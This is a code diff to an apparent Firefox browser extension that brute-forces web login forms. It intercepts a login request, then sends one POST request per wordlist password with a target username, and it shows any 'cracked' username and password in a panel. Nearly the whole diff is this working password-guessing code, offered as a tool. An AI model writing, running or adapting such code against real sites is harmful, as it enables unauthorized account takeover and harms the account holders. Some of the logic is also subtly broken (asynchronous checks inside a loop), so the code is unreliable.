@@ -5,10 +5,15 @@ var pattern = false;
 var failpattern;
 var crackuser;
 var wordlist;
+var wordbyline = [];
 var msgHandler = () => {};
 var cracked = false;
 var pagedata;
-
+var origin;
+var un_f;
+var un_p;
+var ops;
+var pw;
 function handleMessage(msg) {
   msgHandler(msg);
 }
@@ -36,56 +41,6 @@ function cracking_header_listener(e) {
   });
 }
 
-function crack_it(e) {
-  var un_f;
-  var pw_f;
-  var iter;
-  var ops = "";
-  pagedata.body.forEach(body => {
-    if(body.value == crackuser) {
-      un_f = body.name;
-    }
-    if(body.value == "PW") {
-      pw_f = body.name;
-    } 
-    if ((body.value != "PW") && (body.value != crackuser)) {
-      ops = ops.concat(body.name, "=", body.value, "&");
-    }
-  });
-  var wordbyline = wordlist.split("\n");
-  console.log(e.originUrl);
-  for(iter = 0; iter < wordbyline.length-1; iter++) {
-    var xhr = new XMLHttpRequest();
-    xhr.open("POST", e.originUrl, true);
-    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-    console.log("Trying: " + crackuser + " " + wordbyline[iter]);
-    xhr.send(ops + un_f + "=" + crackuser + "&" + pw_f + "=" + wordbyline[iter]);
-    xhr.onload  = function() {
-      var databack = this.responseText;
-      if(databack.length < 5) {
-        console.log("Error short page.");
-      }
-      else if((databack.match(RegExp(failpattern), "gi") == null) && (databack.length > 10)) {
-        cracked = true;
-      }
-    }
-    if(cracked == true) {
-      break;
-    }
-  }
-  if((cracked == true) && (iter != 0)) {
-  return new Promise(done => {
-    browser.windows.create({
-      url: "cracked.html?login=" + crackuser + "&password=" + wordbyline[iter],
-      type: "panel"
-    }).then(w => {
-      });
-    });
- stop_cracking();
-  }
-    //console.log("Sorry, couldn't crack with this wordlist");
-}
-
 function cracking_request_listener(e) {
   if((e.originUrl || "").indexOf("moz-extension://") === 0) return e;
   if(!~types.indexOf(e.type)) return e;
@@ -106,10 +61,54 @@ function cracking_request_listener(e) {
       type: e.type,
       body: body
     };
-    done(e);
-    crack_it(e);
+    origin = e.originUrl;
+    wordbyline = wordlist.split("\n");
+    for(var iter = 0; iter <= wordbyline.length-1; iter++) {
+    ops = "";
+  location.reload();
+  pagedata.body.forEach(body => {
+    if(body.value == crackuser) {
+      ops = ops.concat(body.name, "=", crackuser, "&");
+    }
+    if(body.value == "DUMMY") {
+      ops = ops.concat( body.name, "=", wordbyline[iter], "&");
+    }
+    if ((body.value != "DUMMY") && (body.value != crackuser)) {
+      ops = ops.concat( body.name, "=", body.value, "&");
+    }
   });
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", origin, true);
+    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    console.log("Trying: " + crackuser + " " + wordbyline[iter]);
+    console.log("Sending to " + origin + ": " + ops);
+    xhr.send(ops);
+    xhr.onload  = function() {
+      var databack = this.responseText;
+      if(databack.match(RegExp(failpattern), "ig") == null) {
+        console.log(databack);
+        pw = wordbyline[iter];
+        cracked = true;
 }
+}
+      if(cracked == true) {
+break;
+}
+
+}
+if(cracked == true) {
+      return new Promise(done => {
+      browser.windows.create({
+        url: "cracked.html?login=" + crackuser + "&password=" + pw,
+        type: "panel"
+      }).then(w => {
+ });
+    });
+
+}
+    done(e);
+  });
+  }
 
 function stop_cracking_listener() {
   var listening = browser.webRequest.onBeforeSendHeaders.hasListener(cracking_header_listener);
